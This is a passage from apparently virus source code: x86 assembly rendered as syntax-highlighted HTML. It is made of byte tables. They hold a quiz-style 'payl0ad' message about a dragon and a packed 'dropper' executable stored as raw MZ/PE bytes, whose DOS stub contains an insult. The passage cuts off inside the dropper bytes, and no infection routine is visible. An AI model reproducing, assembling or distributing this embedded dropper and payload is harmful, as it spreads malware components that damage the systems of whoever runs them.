    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">066h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">063h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">041h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">057h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">066h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">064h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">067h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">053h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">063h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">094h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">064h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">053h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Dh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">067h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">063h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">05Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">053h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
</span><span class="sc5">p_size</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">payl0ad</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; Dropper code (packed)</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">

</span><span class="sc5">dropper</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">04Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">016h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">024h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">041h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">046h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">063h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">06Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">079h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">021h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">054h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">071h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">075h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">057h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">032h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">076h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Eh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">024h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Eh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">021h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0F5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">021h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">071h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">045h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ABh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">026h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B4h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">008h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08Eh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">019h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">008h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">04Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">018h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">053h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">043h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">044h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">045h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">006h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">011h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">060h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">063h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">064h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">008h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">060h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">044h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">041h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">054h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">041h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">005h</span><span class="sc0">
